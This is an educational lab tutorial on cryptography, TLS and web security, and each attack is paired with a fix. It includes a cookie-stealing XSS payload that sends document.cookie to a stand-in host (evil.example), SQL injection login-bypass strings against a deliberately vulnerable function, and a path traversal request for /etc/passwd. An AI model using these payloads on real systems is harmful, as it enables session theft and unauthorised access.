# Cryptography and TLS Lab: Hashes, Keys, Certificates and Web Attacks

**Prerequisites:** [sockets lab](../tcp-ip-osi/02-sockets-tcp-udp-lab.md), [HTTP from scratch](../dns-http/01-http-from-scratch.md), [hash functions](../../02-data-structures/hash-tables/01-hash-functions-and-collisions.md), modular arithmetic (see [math for CS](../../00-foundations/math-for-cs/logic-sets-proofs.md)). **You will learn (by running everything locally):** what **confidentiality, integrity and authentication** mean; **cryptographic hashes**, **HMAC** and safe **password storage**; **symmetric versus asymmetric** encryption with a toy **Diffie-Hellman** and **RSA**; how **certificates** and a real **TLS handshake** work (with a throwaway certificate and a local server); and how to reproduce and fix **SQL injection**, **XSS**, **timing attacks** and weak randomness. Educational use only: never invent your own cryptography for production.

## 1. What are we protecting?

| Goal | Question | Tool |
|------|----------|------|
| **Confidentiality** | can anyone else read it? | encryption |
| **Integrity** | was it changed on the way? | hashes, MACs, signatures |
| **Authentication** | am I really talking to who I think? | certificates, signatures, passwords |
| **Non-repudiation** | can the sender deny sending it? | digital signatures |

**Golden rule: do not roll your own crypto.** Use vetted libraries and protocols (TLS, `cryptography`, libsodium, `hashlib`/`hmac`/`secrets` for basics). The labs below teach *ideas* with tiny numbers and standard-library tools.

## 2. Cryptographic hash functions

A hash function maps any input to a **fixed-size fingerprint**. A *cryptographic* one is also: **one-way** (cannot recover the input), **collision resistant** (cannot find two inputs with the same hash), and shows the **avalanche effect** (a one-bit change flips about half the output bits).

```python
import hashlib

print(hashlib.sha256(b"hello").hexdigest())
# 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
print(len(hashlib.sha256(b"x").digest()), len(hashlib.sha256(b"x" * 10_000_000).digest()))      # 32 32   (always 256 bits)

def bits_different(a: bytes, b: bytes) -> int:
    return sum(bin(x ^ y).count("1") for x, y in zip(a, b))

h1 = hashlib.sha256(b"hello world").digest()
h2 = hashlib.sha256(b"hello worle").digest()                         # one character changed
print(bits_different(h1, h2), "of 256 output bits differ")           # 140 of 256: about half, as expected for an unrelated-looking output
```

Uses: file integrity (download checksums), deduplication, Git object ids, digital signatures, password storage (with extra care, below). **MD5 and SHA-1 are broken** for security (collisions can be forged); use **SHA-256/SHA-3/BLAKE2**.

```python
import hashlib, time
data = b"x" * 50_000_000
for name in ("md5", "sha1", "sha256", "blake2b"):
    t = time.perf_counter(); hashlib.new(name, data).digest()
    print(f"{name:8}{(time.perf_counter() - t) * 1000:6.0f} ms for 50 MB")
```

(Hashes are designed to be **fast**: a feature for checksums and a flaw for passwords, see section 4.)

## 3. HMAC: integrity with a secret key

A plain hash proves nothing about *who* made it: anyone can hash a tampered message. An **HMAC** mixes in a **shared secret key**, so only holders of the key can produce a valid tag.

```python
import hmac, hashlib, secrets

key = secrets.token_bytes(32)                                        # a random shared secret
message = b"transfer 100 to account 42"
tag = hmac.new(key, message, hashlib.sha256).digest()

def verify(key, message, tag):
    expected = hmac.new(key, message, hashlib.sha256).digest()
    return hmac.compare_digest(expected, tag)                        # constant-time comparison (see section 8)

print(verify(key, message, tag))                                     # True
print(verify(key, b"transfer 900 to account 42", tag))               # False   (tampering detected)
print(verify(secrets.token_bytes(32), message, tag))                 # False   (wrong key)
```

Real uses: **webhook signatures** (Stripe, GitHub send an HMAC of the body), **signed cookies and JWTs (HS256)**, API request signing (AWS).

## 4. Storing passwords

Never store passwords, and never store a plain fast hash of them. Attackers who steal the database try billions of guesses per second against fast hashes and **rainbow tables** (precomputed hashes of common passwords). The recipe:

1. A random **salt** per user (defeats precomputed tables and makes equal passwords hash differently).
2. A **deliberately slow, memory-hungry** password hash: **argon2id**, **scrypt** or **bcrypt** (or PBKDF2 with many iterations).
3. Store `algorithm + parameters + salt + hash`, compare in constant time.

```python
import hashlib, os, hmac, time

def hash_password(password: str, iterations=200_000) -> str:
    salt = os.urandom(16)
    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations)
    return f"pbkdf2_sha256${iterations}${salt.hex()}${digest.hex()}"

def check_password(password: str, stored: str) -> bool:
    algo, iterations, salt_hex, digest_hex = stored.split("$")
    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt_hex), int(iterations))
    return hmac.compare_digest(digest.hex(), digest_hex)

stored = hash_password("correct horse battery staple")
print(stored.split("$")[0], len(stored) > 100)                      # pbkdf2_sha256 True
print(check_password("correct horse battery staple", stored), check_password("password123", stored))      # True False
print(hash_password("same") != hash_password("same"))               # True   (different salts: identical passwords look different)

t = time.perf_counter(); hashlib.sha256(b"guess").digest(); fast = time.perf_counter() - t
t = time.perf_counter(); hashlib.pbkdf2_hmac("sha256", b"guess", b"salt", 200_000); slow = time.perf_counter() - t
print(slow > 100 * fast)                                             # True   (the slow hash makes each guess hundreds of times costlier)

t = time.perf_counter(); hashlib.scrypt(b"guess", salt=b"saltsaltsalt", n=2**14, r=8, p=1); print(time.perf_counter() - t > 0.005)       # True   (scrypt also needs lots of memory)
```

Login hygiene: identical error for "unknown user" and "wrong password", rate limiting, **multi-factor authentication**, breach checks (haveibeenpwned k-anonymity API), password managers.

## 5. Symmetric and asymmetric cryptography

| | **Symmetric** | **Asymmetric (public key)** |
|---|---------------|------------------------------|
| Keys | one **shared secret** key | a **key pair**: public (share) + private (secret) |
| Speed | very fast | roughly 1000x slower |
| Problem | how do two strangers share the key safely? | solves that |
| Algorithms | AES, ChaCha20 | RSA, ECDSA, Ed25519, X25519 (Diffie-Hellman) |

Real protocols **combine** both: asymmetric math to agree on a secret, symmetric encryption for the actual data. That is exactly TLS.

### Toy Diffie-Hellman: agreeing on a secret in public

Alice and Bob want a shared secret while an eavesdropper hears everything they say.

1. Public numbers: a prime `p` and a generator `g`.
2. Alice picks secret `a`, sends `A = g^a mod p`. Bob picks secret `b`, sends `B = g^b mod p`.
3. Alice computes `B^a mod p`; Bob computes `A^b mod p`. Both equal `g^(ab) mod p`.

```python
p, g = 23, 5                                           # tiny public numbers (real: 2048-bit primes or elliptic curves)
a, b = 6, 15                                           # the secrets (never sent)
A, B = pow(g, a, p), pow(g, b, p)                      # the public values that cross the network
print(A, B)                                            # 8 19
alice_secret, bob_secret = pow(B, a, p), pow(A, b, p)
print(alice_secret, bob_secret, alice_secret == bob_secret)       # 2 2 True

# An eavesdropper knows p, g, A, B but must solve the discrete logarithm. Easy for p = 23, impossible for 2048 bits:
print([x for x in range(1, p) if pow(g, x, p) == A])   # [6]   (brute force finds a immediately: the numbers are tiny)
```

Notice Diffie-Hellman gives key agreement but not **authentication**: someone in the middle could run it with each side separately (**man-in-the-middle**). Certificates fix that (section 6).

### Toy RSA: encryption and signatures

RSA uses `n = p * q` with secret primes. Public key `(n, e)`, private key `d` with `e * d = 1 (mod (p-1)(q-1))`.

```python
p_, q_ = 61, 53
n = p_ * q_                                            # 3233 (the public modulus)
phi = (p_ - 1) * (q_ - 1)                              # 3120
e = 17
d = pow(e, -1, phi)                                    # modular inverse: the private exponent
print(n, d)                                            # 3233 2753

message = 65
cipher = pow(message, e, n)                            # encrypt with the PUBLIC key
print(cipher, pow(cipher, d, n))                       # 2790 65     (decrypt with the PRIVATE key)

signature = pow(message, d, n)                         # sign with the PRIVATE key ...
print(pow(signature, e, n) == message)                 # True       ... anyone verifies with the PUBLIC key
```

Real RSA uses 2048+ bit numbers, random **padding** (OAEP/PSS) and a hash of the message when signing. Modern systems prefer **elliptic curves** (X25519, Ed25519): smaller keys, same security. **Digital signatures** prove who sent something and that it was not altered.

## 6. Certificates: who owns this public key?

Public keys alone do not say who owns them. A **certificate** binds a **public key to an identity** (a domain name) and is **signed by a Certificate Authority (CA)** your device already trusts.

```text
Root CA (in your OS/browser trust store)  --signs-->  Intermediate CA  --signs-->  Server certificate for example.com
                                                                                   (domain, public key, validity dates, signature)
```

The browser verifies: (1) the signature chain leads to a trusted root, (2) the name matches the site, (3) it is within its validity dates, (4) it has not been revoked. This is what stops man-in-the-middle attacks and what the padlock means.

## 7. Lab: a real TLS handshake on localhost

We create a throwaway **self-signed certificate** with the `openssl` command, start a TLS server, and connect with a verifying client.

```python
import ssl, socket, threading, tempfile, subprocess, os

workdir = tempfile.mkdtemp()
key_path, cert_path = os.path.join(workdir, "key.pem"), os.path.join(workdir, "cert.pem")
subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key_path, "-out", cert_path,
                "-days", "2", "-subj", "/CN=localhost", "-addext", "subjectAltName=DNS:localhost,IP:127.0.0.1"],
               check=True, capture_output=True)
print(os.path.exists(cert_path), "BEGIN CERTIFICATE" in open(cert_path).read())      # True True

def tls_server(ready, stop):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_path, key_path)
    with socket.socket() as srv:
        srv.bind(("127.0.0.1", 0)); srv.listen()
        ready.append(srv.getsockname()[1])
        srv.settimeout(0.2)
        while not stop.is_set():
            try:
                raw, _ = srv.accept()
            except socket.timeout:
                continue
            try:
                with context.wrap_socket(raw, server_side=True) as conn:
                    conn.sendall(b"secret reply to: " + conn.recv(100))
            except (ssl.SSLError, OSError):
                pass                                               # a client that rejected us aborts the handshake

ready, stop = [], threading.Event()
server_thread = threading.Thread(target=tls_server, args=(ready, stop)); server_thread.start()
while not ready: pass
PORT = ready[0]
```

**A successful, verified connection** (the client trusts our certificate as a CA):

```python
client_ctx = ssl.create_default_context(cafile=cert_path)           # verify certificates AND hostnames
with socket.create_connection(("127.0.0.1", PORT)) as raw:
    with client_ctx.wrap_socket(raw, server_hostname="localhost") as tls:
        tls.sendall(b"hello")
        print(tls.recv(100))                                        # b'secret reply to: hello'
        print(tls.version(), tls.cipher()[0])                       # TLSv1.3 TLS_AES_256_GCM_SHA384
        print(tls.getpeercert()["subject"])                         # ((('commonName', 'localhost'),),)
```

TLS 1.3 negotiated an **AEAD cipher** (AES-256-GCM: encrypts *and* authenticates) with SHA-384 for the key derivation.

**Failure 1: untrusted certificate.** A client that does not trust our CA refuses:

```python
default_ctx = ssl.create_default_context()                          # trusts only the system's real CAs
try:
    with socket.create_connection(("127.0.0.1", PORT)) as raw:
        default_ctx.wrap_socket(raw, server_hostname="localhost")
except ssl.SSLCertVerificationError as e:
    print("refused:", e.verify_message)                              # refused: self-signed certificate
```

**Failure 2: wrong hostname.** The certificate is valid but not for the name we asked for (what stops a man in the middle presenting *some other* valid certificate):

```python
try:
    with socket.create_connection(("127.0.0.1", PORT)) as raw:
        client_ctx.wrap_socket(raw, server_hostname="bank.example.com")
except ssl.SSLCertVerificationError as e:
    print("refused:", "Hostname mismatch" in str(e))                 # refused: True
```

**What an eavesdropper sees.** Capture raw bytes with and without TLS:

```python
# plaintext conversation
a, b = socket.socketpair()
a.sendall(b"password=hunter2")
print(b.recv(100))                                                   # b'password=hunter2'    (anyone on the path can read this)
a.close(); b.close()

# the same words through TLS: the wire shows only ciphertext. We read the raw bytes of a TLS session via a recording proxy.
captured = []
def recording_proxy(listen_sock, target_port):
    client, _ = listen_sock.accept()
    upstream = socket.create_connection(("127.0.0.1", target_port))
    client.settimeout(0.3); upstream.settimeout(0.3)
    for _ in range(20):                                              # shuttle bytes both ways and remember them
        for src, dst in ((client, upstream), (upstream, client)):
            try:
                data = src.recv(65536)
            except (socket.timeout, OSError):
                continue
            if data:
                captured.append(data); dst.sendall(data)
    client.close(); upstream.close()

proxy = socket.socket(); proxy.bind(("127.0.0.1", 0)); proxy.listen()
proxy_thread = threading.Thread(target=recording_proxy, args=(proxy, PORT)); proxy_thread.start()
with socket.create_connection(("127.0.0.1", proxy.getsockname()[1])) as raw:
    with client_ctx.wrap_socket(raw, server_hostname="localhost") as tls:
        tls.sendall(b"password=hunter2")
        tls.recv(100)
proxy_thread.join()
wire = b"".join(captured)
print(len(wire) > 100, b"hunter2" in wire, b"secret reply" in wire)     # True False False   (the proxy saw bytes, but none of the plaintext)
stop.set(); server_thread.join()
```

The proxy sits exactly where an attacker on the network would sit. It sees a handshake and encrypted records, never the password. And because the client **verifies the certificate**, the proxy cannot swap in its own key without being rejected.

### The TLS 1.3 handshake in words (1 round trip)

```text
Client                                                       Server
ClientHello: supported ciphers, a fresh key share (DH)  ->
                                                        <-  ServerHello: chosen cipher, its key share
                                                            {Certificate, signature, Finished}   (already encrypted)
Both sides now derive the same session keys from the Diffie-Hellman exchange
{Finished}  ->     then application data, encrypted and authenticated with AES-GCM / ChaCha20-Poly1305
```

Key properties: **forward secrecy** (session keys come from ephemeral Diffie-Hellman values, so a stolen server key cannot decrypt recorded traffic), **authentication** (the server proves it owns the certificate's key), **integrity** (every record is authenticated). TLS 1.3 needs **one round trip** (TLS 1.2 needed two), and **0-RTT resumption** can send data immediately on reconnects (with replay caveats).

Practical checks:

```bash
openssl s_client -connect example.com:443 -servername example.com </dev/null | openssl x509 -noout -dates -subject -issuer
curl -vI https://example.com 2>&1 | grep -E "TLS|subject|expire"
```

## 8. Timing attacks and secure comparison

Comparing secrets with `==` stops at the first different byte, so response time leaks how many leading characters were right. An attacker can recover a secret one character at a time. `hmac.compare_digest` takes the same time regardless.

```python
import time

secret = "s3cr3t-token-9f8a7b6c5d4e3f2a1b0c"

def naive_equal(a, b):
    for x, y in zip(a, b):
        if x != y:
            return False
        for _ in range(2000): pass                                   # exaggerate the per-character cost for the demo
    return len(a) == len(b)

def average_time(guess, repeats=200):
    t = time.perf_counter()
    for _ in range(repeats): naive_equal(secret, guess)
    return time.perf_counter() - t

wrong_first = average_time("X" + secret[1:])                         # differs at the first character
wrong_last = average_time(secret[:-1] + "X")                         # differs at the last character
print(wrong_last > 5 * wrong_first)                                  # True   (the longer the matching prefix, the longer it takes: a leak)
```

Use `hmac.compare_digest(a, b)` (and the `secrets` module for tokens).

## 9. Randomness: use `secrets`, not `random`

`random` (Mersenne Twister) is predictable from a few outputs. Anything security-related (tokens, session ids, password resets, salts) must use the OS's cryptographic random source.

```python
import random, secrets

random.seed(1)
print(random.getrandbits(32), random.getrandbits(32))               # 577090037 2444712010   (the same every run: predictable!)
print(len(secrets.token_urlsafe(32)), secrets.token_hex(8) != secrets.token_hex(8))        # 43 True
print(secrets.choice("abcdef") in "abcdef", secrets.randbelow(10) < 10)                    # True True
```

## 10. Web attacks you can reproduce (and fix)

### SQL injection

Never build SQL by gluing strings; attackers type SQL into your form fields.

```python
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (name TEXT, password TEXT, is_admin INTEGER)")
db.executemany("INSERT INTO users VALUES (?, ?, ?)", [("ana", "pw-ana", 0), ("root", "pw-root", 1)])

def login_vulnerable(name, password):
    query = f"SELECT name FROM users WHERE name = '{name}' AND password = '{password}'"      # DANGEROUS string building
    return db.execute(query).fetchall()

print(login_vulnerable("ana", "wrong"))                              # []
print(login_vulnerable("ana", "' OR '1'='1"))                        # [('ana',), ('root',)]   the OR makes the condition true for EVERY row
print(login_vulnerable("x' OR 1=1 --", "anything"))                  # [('ana',), ('root',)]   the comment (--) removed the password check entirely

def login_safe(name, password):
    return db.execute("SELECT name FROM users WHERE name = ? AND password = ?", (name, password)).fetchall()    # parameters: data, never code

print(login_safe("ana", "' OR '1'='1"), login_safe("ana", "pw-ana"))      # [] [('ana',)]
```

The fix is **parameterized queries** (placeholders), which the database treats strictly as data. ORMs do this for you; raw SQL needs discipline. See [databases](../../05-databases/README.md).

### Cross-site scripting (XSS)

If you put user text into HTML unescaped, an attacker's `<script>` runs in every visitor's browser (stealing cookies, acting as the user).

```python
import html

comment = '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>'
unsafe_page = f"<p>Comment: {comment}</p>"
safe_page = f"<p>Comment: {html.escape(comment)}</p>"
print("<script>" in unsafe_page, "<script>" in safe_page)            # True False
print(safe_page[:60])                                                # <p>Comment: &lt;script&gt;fetch(&quot;https://evil.example/steal?c=...
```

Defenses: **escape output** for its context (HTML, attribute, JavaScript, URL), use template engines with auto-escaping, set `HttpOnly` cookies, and add a **Content-Security-Policy** header.

### CSRF (cross-site request forgery)

While you are logged in to `bank.com`, a malicious page makes your browser send `POST bank.com/transfer` and the browser **attaches your cookie automatically**. Defenses: **`SameSite=Lax/Strict` cookies**, unpredictable **CSRF tokens** in forms, checking `Origin`/`Referer`, requiring a custom header for APIs.

### Others to know

| Attack | In one line | Defense |
|--------|-------------|---------|
| **Path traversal** | `GET /files?name=../../etc/passwd` | resolve paths and check they stay inside the allowed folder |
| **SSRF** | trick the server into fetching internal URLs | allow-list destinations, block private IP ranges |
| **Command injection** | user input reaches a shell | pass argument **lists** to `subprocess`, never shell strings |
| **Brute force / credential stuffing** | try many (leaked) passwords | rate limiting, MFA, breach checks |
| **Man-in-the-middle** | read or alter traffic | TLS with certificate validation (never `verify=False`) |
| **DDoS** | flood a service | CDN, rate limits, autoscaling, upstream filtering |

```python
import os

def safe_join(base, user_path):
    full = os.path.realpath(os.path.join(base, user_path))
    if not full.startswith(os.path.realpath(base) + os.sep):
        raise PermissionError("path escapes the allowed directory")
    return full

print(safe_join("/srv/files", "reports/q1.pdf"))                     # /srv/files/reports/q1.pdf
try:
    safe_join("/srv/files", "../../etc/passwd")
except PermissionError as e:
    print("blocked:", e)                                             # blocked: path escapes the allowed directory
```

## 11. A security checklist for your own services

1. HTTPS everywhere; redirect HTTP to HTTPS; HSTS header.
2. Hash passwords with argon2id/bcrypt/scrypt; add MFA.
3. Parameterized queries; validate input; escape output.
4. Cookies: `Secure`, `HttpOnly`, `SameSite`.
5. Secrets in environment variables or a secrets manager, never in Git; rotate them.
6. Principle of **least privilege** (database users, cloud roles, file permissions).
7. Keep dependencies updated; scan them (`pip-audit`).
8. Log security events (without logging secrets); rate limit login and expensive endpoints.
9. Never disable certificate verification (`verify=False`) "just to make it work".

## 12. Two real-world examples

**Example 1: A leaked password database.** Company A stored `md5(password)`: attackers cracked 80% of accounts within hours using rainbow tables and GPUs. Company B stored salted argon2id hashes: the same attackers cracked only the few passwords that were extremely common, at a huge cost per guess. Same breach, very different damage.

**Example 2: Why HTTPS padlocks exist.** On a coffee-shop Wi-Fi anyone can capture packets. Over plain HTTP they would read your session cookie and take over your account (**session hijacking**). Over HTTPS they see only encrypted records, and the certificate check prevents a rogue access point from impersonating your bank.

## 13. Common mistakes

- Inventing your own encryption or "obfuscating" with base64 or XOR (encoding is not encryption).
- Storing passwords with a fast hash, without a salt, or in plain text.
- Using `random` for tokens, `==` for secrets, MD5/SHA-1 for security.
- Building SQL or shell commands from strings.
- Disabling TLS verification (`verify=False`, `ssl._create_unverified_context`).
- Committing keys and passwords to Git (they live in history forever; rotate them).
- Believing HTTPS makes your *application* secure (it only protects data in transit).
- Rolling back to old TLS versions or weak ciphers for compatibility.

## 14. Practice

1. Which of confidentiality, integrity and authentication does a plain SHA-256 checksum of a download provide? What would add authenticity?
2. Compute a Diffie-Hellman shared secret with `p=23, g=5, a=4, b=3`.
3. With the toy RSA keys (`n=3233, e=17, d=2753`), encrypt `42` and decrypt it back.
4. Why is salting a password hash necessary even with a slow algorithm?
5. A site's certificate is valid but for `shop.example.com` and you connect to `bank.example.com`. What happens and why?
6. Make `login_vulnerable` safe in one line.
7. Why must `hmac.compare_digest` be used instead of `==` for tokens?
8. Name the cookie attributes that mitigate XSS theft and CSRF.

<details>
<summary>Solutions</summary>

1. Only integrity against *accidental* corruption (anyone can recompute it). To prove the download is authentic, sign the hash (or the file) with a private key and publish the signature, or use an HMAC with a shared key.
2. `A = 5^4 mod 23 = 4`, `B = 5^3 mod 23 = 10`; shared = `B^4 mod 23 = 18`.
   ```python
   A, B = pow(5, 4, 23), pow(5, 3, 23)
   print(A, B, pow(B, 4, 23), pow(A, 3, 23))                       # 4 10 18 18
   ```
3. ```python
   c = pow(42, 17, 3233)
   print(c, pow(c, 2753, 3233))                                    # 2557 42
   ```
4. Without salt, identical passwords produce identical hashes and attackers can use precomputed tables or crack all users with one guess at once; a unique salt forces per-user work.
5. The client refuses: the hostname does not match the certificate, so the server cannot prove it is `bank.example.com`. This is what stops a man in the middle from presenting some other valid certificate.
6. ```python
   login_safe("root", "pw-root")                                   # use placeholders: db.execute("... WHERE name = ? AND password = ?", (name, password))
   ```
7. `==` returns at the first mismatch, so its running time leaks how much of the guess was correct; `compare_digest` takes constant time.
8. `HttpOnly` (JavaScript cannot read the cookie), `Secure` (HTTPS only) and `SameSite=Lax/Strict` (limits cross-site sending, defending against CSRF).

</details>

## 15. Check yourself

1. What are the three properties of a cryptographic hash?
2. What is the difference between a hash and an HMAC?
3. Why use both asymmetric and symmetric crypto in TLS?
4. What does a certificate bind, and who vouches for it?
5. What is forward secrecy?
6. Why parameterize SQL queries?
7. Why is `secrets` preferred over `random`?

<details>
<summary>Answers</summary>

1. One-way (preimage resistant), collision resistant, avalanche effect (small input change gives an unrelated output).
2. A hash has no key (anyone can compute it); an HMAC needs a secret key, so only key holders can create or verify the tag.
3. Asymmetric crypto solves key agreement between strangers but is slow; symmetric encryption is fast for bulk data once a shared key exists.
4. A public key to an identity (such as a domain name), vouched for by a signature from a certificate authority the client trusts.
5. Session keys come from ephemeral key exchange, so compromising a long-term key later does not reveal past recorded traffic.
6. Placeholders make the database treat input strictly as data, so input cannot change the query's structure.
7. `secrets` draws from the OS cryptographic random source and is unpredictable; `random` is a deterministic generator whose output can be predicted.

</details>

[Back to TLS and security](README.md)
